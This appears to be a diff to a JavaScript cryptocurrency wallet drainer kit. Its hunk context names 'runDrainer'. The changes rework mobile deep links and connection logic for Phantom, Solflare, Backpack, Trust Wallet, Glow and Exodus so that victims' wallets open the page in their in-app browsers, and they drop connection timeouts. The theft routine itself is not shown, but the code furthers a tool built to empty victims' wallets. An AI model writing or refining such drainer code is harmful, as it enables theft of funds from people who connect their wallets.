@@ -319,14 +319,11 @@
           case 'Trust Wallet':
             // Trust Wallet specific fallbacks - avoid signIn as it's not implemented
             if (provider && typeof provider.connect === 'function') {
-              // Trying Trust Wallet connect with timeout
+              // Trust Wallet handles its own timeouts
               const connectPromise = provider.connect();
-              const timeoutPromise = new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 60000)
-              );
               
               try {
-                await Promise.race([connectPromise, timeoutPromise]);
+                await connectPromise;
               } catch (fallbackError) {
                 // Trust Wallet connect failed
                 showStatus('Failed', 'error');
@@ -2984,17 +2981,11 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
           playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
-          deepLink: 'backpack://v1/connect',
-          universalLink: 'https://backpack.app/ul/v1/connect',
+          deepLink: 'https://backpack.app/ul/v1/browse/',
+          universalLink: 'https://backpack.app/ul/v1/browse/',
           mobileStrategies: [
-            'backpack://v1/connect',
-            'backpack://app?url=',
-            'backpack://open?url=',
-            'backpack://browse?url=',
-            'https://backpack.app/ul/v1/connect',
-            'https://backpack.app/ul/app?url=',
-            'https://backpack.app/ul/open?url=',
-            'https://backpack.app/ul/browse?url='
+            'https://backpack.app/ul/v1/browse/',
+            'backpack://v1/browse/'
           ]
         }
       },
@@ -3019,20 +3010,12 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
           playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
-          deepLink: 'phantom://v1/connect',
-          universalLink: 'https://phantom.app/ul/v1/connect',
+          deepLink: 'https://phantom.app/ul/browse/',
+          universalLink: 'https://phantom.app/ul/browse/',
           // Mobile-specific deep link strategies (only for mobile browsers)
           mobileStrategies: [
-            'phantom://v1/connect',
-            'phantom://browse/',
-            'phantom://app/',
-            'phantom://dapp/',
-            'phantom://open/',
-            'https://phantom.app/ul/v1/connect',
             'https://phantom.app/ul/browse/',
-            'https://phantom.app/ul/app/',
-            'https://phantom.app/ul/dapp/',
-            'https://phantom.app/ul/open/'
+            'phantom://browse/'
           ]
         }
       },
@@ -3060,20 +3043,12 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/solflare/id1580902717',
           playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
-          deepLink: 'solflare://v1/connect',
-          universalLink: 'https://solflare.com/ul/v1/connect',
+          deepLink: 'https://solflare.com/ul/v1/browse/',
+          universalLink: 'https://solflare.com/ul/v1/browse/',
           // Mobile-specific deep link strategies (only for mobile browsers)
           mobileStrategies: [
-            'solflare://v1/connect',
-            'solflare://browse/',
-            'solflare://app/',
-            'solflare://dapp/',
-            'solflare://open/',
-            'https://solflare.com/ul/v1/connect',
-            'https://solflare.com/ul/browse/',
-            'https://solflare.com/ul/app/',
-            'https://solflare.com/ul/dapp/',
-            'https://solflare.com/ul/open/'
+            'https://solflare.com/ul/v1/browse/',
+            'solflare://v1/browse/'
           ]
         }
       },
@@ -3193,18 +3168,12 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
           playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-          deepLink: 'trust://open?url=',
-          universalLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
+          deepLink: 'https://link.trustwallet.com/open_url',
+          universalLink: 'https://link.trustwallet.com/open_url',
           // Mobile-specific deep link strategies (only for mobile browsers)
           mobileStrategies: [
-            'trust://open?url=',
-            'trust://browse?url=',
-            'trust://dapp?url=',
-            'trust://app?url=',
-            'https://link.trustwallet.com/open_url?coin_id=501&url=',
-            'https://link.trustwallet.com/browse_url?coin_id=501&url=',
-            'https://link.trustwallet.com/dapp_url?coin_id=501&url=',
-            'https://link.trustwallet.com/app_url?coin_id=501&url='
+            'https://link.trustwallet.com/open_url',
+            'trust://open_url'
           ]
         }
       },
@@ -5537,21 +5506,11 @@ window.runDrainer = runDrainer;
       let deepLink = '';
       let fallbackUrl = '';
       
-      // Enhanced mobile detection with platform-specific identification
+      // Simplified mobile detection
       const userAgent = navigator.userAgent.toLowerCase();
-      let isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
-      
-      // Additional mobile detection for newer browsers
-      if (!isMobileDevice) {
-        isMobileDevice = /mobile|tablet/i.test(userAgent) || 
-                        (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
-                        window.innerWidth <= 768;
-      }
-      
-      // Platform-specific detection
-      const isIOS = /iphone|ipad|ipod/.test(userAgent);
-      const isAndroid = /android/.test(userAgent);
-      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
+      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent) || 
+                            (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                            window.innerWidth <= 768;
       
       // For mobile devices, use enhanced deep link handling
           if (isMobileDevice) {
@@ -5560,74 +5519,82 @@ window.runDrainer = runDrainer;
       
       switch(walletType) {
         case 'phantom':
-          // Phantom: Use backend API for deep link generation
-          try {
-            const phantomLinks = await generateDeepLink('phantom', currentUrl);
-            deepLink = phantomLinks.deepLink;
-            fallbackUrl = phantomLinks.fallbackLink;
-          } catch (error) {
-            console.error('[PHANTOM_DEEP_LINK] Error generating deep link:', error);
+          // Phantom: Use correct URL structure for mobile, complex API for desktop
+          if (isMobileDevice) {
+            // Mobile: Use correct Phantom URL structure with ref parameter
+            const encodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
+            fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
+          } else {
+            // Desktop: Use complex Connect API (unchanged)
             deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
             fallbackUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'solflare':
-          // Solflare: Use backend API for deep link generation
-          try {
-            const solflareLinks = await generateDeepLink('solflare', currentUrl);
-            deepLink = solflareLinks.deepLink;
-            fallbackUrl = solflareLinks.fallbackLink;
-          } catch (error) {
-            console.error('[SOLFLARE_DEEP_LINK] Error generating deep link:', error);
+          // Solflare: Use correct URL structure for mobile, complex API for desktop
+          if (isMobileDevice) {
+            // Mobile: Use correct Solflare URL structure (v1/browse with ref parameter)
+            const encodedUrl = encodeURIComponent(currentUrl);
+            const params = new URLSearchParams({
+              ref: "https://solflare.com"
+            });
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?${params.toString()}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?${params.toString()}`;
+          } else {
+            // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
             fallbackUrl = `https://solflare.com/ul/browse/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'backpack':
-          // Backpack: Use backend API for deep link generation
-          try {
-            const backpackLinks = await generateDeepLink('backpack', currentUrl);
-            deepLink = backpackLinks.deepLink;
-            fallbackUrl = backpackLinks.fallbackLink;
-          } catch (error) {
-            console.error('[BACKPACK_DEEP_LINK] Error generating deep link:', error);
-            deepLink = `backpack://app?url=${encodeURIComponent(currentUrl)}`;
-            fallbackUrl = `https://backpack.app/ul/app?url=${encodeURIComponent(currentUrl)}`;
+          // Backpack: Use correct URL structure for mobile, complex API for desktop
+          if (isMobileDevice) {
+            // Mobile: Use correct Backpack browse URL structure (v1/browse with URL in path)
+            const encodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+            fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+          } else {
+            // Desktop: Use custom scheme first
+            deepLink = `backpack://browse/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://backpack.app/ul/browse/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'trustwallet':
-          // Trust Wallet: Use backend API for deep link generation
-          try {
-            const trustWalletLinks = await generateDeepLink('trustwallet', currentUrl);
-            deepLink = trustWalletLinks.deepLink;
-            fallbackUrl = trustWalletLinks.fallbackLink;
-          } catch (error) {
-            console.error('[TRUSTWALLET_DEEP_LINK] Error generating deep link:', error);
-            deepLink = `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(currentUrl)}`;
-            fallbackUrl = `trust://open_url?coin_id=501&url=${encodeURIComponent(currentUrl)}`;
+          // Trust Wallet: Use correct URL structure for mobile, complex API for desktop
+          if (isMobileDevice) {
+            // Mobile: Use correct Trust Wallet URL structure
+            const encodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
+            fallbackUrl = `trust://open_url?url=${encodedUrl}`;
+          } else {
+            // Desktop: Use custom scheme first
+            deepLink = `trust://open_url?url=${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'glow':
-          // Glow: Try multiple deep link strategies
+          // Glow: Use simplified deep links for better mobile support
           if (isMobileDevice) {
-            // Try direct app scheme first, then universal link
-            deepLink = 'glow://app/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://glow.app/ul/app/' + encodeURIComponent(currentUrl);
+            // Mobile: Use universal link first (more reliable)
+            deepLink = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `glow://app/${encodeURIComponent(currentUrl)}`;
           } else {
-            deepLink = 'glow://app/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://glow.app/ul/app/' + encodeURIComponent(currentUrl);
+            // Desktop: Use custom scheme
+            deepLink = `glow://app/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
           }
           break;
         case 'exodus':
-          // Exodus: Try multiple deep link strategies
+          // Exodus: Use simplified deep links for better mobile support
           if (isMobileDevice) {
-            // Mobile: Use universal links for better reliability
-            deepLink = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
+            // Mobile: Use universal link first (more reliable)
+            deepLink = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
           } else {
             // Desktop: Use custom scheme
-            deepLink = 'exodus://dapp/' + encodeURIComponent(currentUrl);
-            fallbackUrl = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
+            deepLink = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
           }
           break;
           
@@ -5649,73 +5616,36 @@ window.runDrainer = runDrainer;
       console.log(`[DEEP_LINK] ${isMobileDevice ? 'Mobile' : 'Desktop'} device detected`);
       console.log(`[DEEP_LINK] Attempting to open ${walletType} with:`, deepLink);
       
-      // Enhanced deep link opening with platform-specific strategies
+      // Improved deep link opening with better mobile support
       try {
         if (isMobileDevice) {
-          // On mobile, use platform-specific strategies
-          console.log(`[DEEP_LINK] Mobile ${platform}: attempting platform-specific strategies`);
+          console.log(`[DEEP_LINK] Mobile device: using improved approach`);
           
-          if (platform === 'ios') {
-            // iOS: Use iframe method for better reliability
-            console.log(`[DEEP_LINK] iOS: using iframe method for ${deepLink}`);
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = deepLink;
-            document.body.appendChild(iframe);
-            
-            // Clean up iframe after attempt
-            setTimeout(() => {
-              if (document.body.contains(iframe)) {
-                document.body.removeChild(iframe);
-              }
-            }, 1000);
-            
-            // Try fallback after delay
-            setTimeout(() => {
-              console.log(`[DEEP_LINK] iOS: trying fallback: ${fallbackUrl}`);
-            window.location.href = fallbackUrl;
-            }, 2000);
-            
-          } else if (platform === 'android') {
-            // Android: Direct location change with App Links preference
-            console.log(`[DEEP_LINK] Android: trying App Link first: ${fallbackUrl}`);
-            window.location.href = fallbackUrl;
-            
-            // Try custom scheme as fallback
-            setTimeout(() => {
-              if (window.location.href === currentUrl) {
-                console.log(`[DEEP_LINK] Android: App Link failed, trying custom scheme: ${deepLink}`);
-                window.location.href = deepLink;
-              }
-            }, 1500);
-            
-          } else {
-            // Unknown mobile platform - try both strategies
-            console.log(`[DEEP_LINK] Unknown mobile platform: trying both strategies`);
+          // For mobile, try universal link first (more reliable)
+          console.log(`[DEEP_LINK] Trying universal link: ${fallbackUrl}`);
+          
+          // Use a more reliable method for mobile deep links
+          const link = document.createElement('a');
+          link.href = fallbackUrl;
+          link.target = '_blank';
+          link.rel = 'noopener noreferrer';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+          
+          // If that doesn't work, try custom scheme after a short delay
+          setTimeout(() => {
+            console.log(`[DEEP_LINK] Trying custom scheme: ${deepLink}`);
             window.location.href = deepLink;
-            
-            setTimeout(() => {
-              if (window.location.href === currentUrl) {
-                window.location.href = fallbackUrl;
-              }
-            }, 1500);
-          }
+          }, 1500);
+          
+          // Show a message to the user about what's happening
+          showStatus(`Opening ${walletType} wallet...`, 'info');
           
         } else {
-          // On desktop, try window.open first, then fallback
-          console.log(`[DEEP_LINK] Desktop: trying window.open first`);
-          const newWindow = window.open(deepLink, '_blank');
-          
-          if (!newWindow || newWindow.closed) {
-            console.log(`[DEEP_LINK] Desktop: window.open failed, using location.href`);
-            window.location.href = deepLink;
-          }
-          
-          // Set a timeout to redirect to fallback if deep link doesn't work (desktop only)
-          setTimeout(() => {
-            console.log(`[DEEP_LINK] Desktop: Redirecting to fallback URL:`, fallbackUrl);
-            window.location.href = fallbackUrl;
-          }, 3000);
+          // Desktop: Direct window location change
+          console.log(`[DEEP_LINK] Desktop: direct navigation to ${deepLink}`);
+          window.location.href = deepLink;
         }
         
       } catch (error) {
@@ -6189,11 +6119,9 @@ window.connectWallet = async function connectWallet(walletKey) {
                   console.log(`[CONNECT] Trust Wallet ${strategy.name}...`);
                   
                   const connectPromise = strategy.fn();
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 45000) // 45 seconds per attempt for Trust Wallet
-                );
+                // Trust Wallet handles its own timeouts - no artificial timeout needed
                   
-                response = await Promise.race([connectPromise, timeoutPromise]);
+                response = await connectPromise;
                   publicKey = response?.publicKey || 
                              provider.publicKey || 
                              provider.account?.publicKey ||
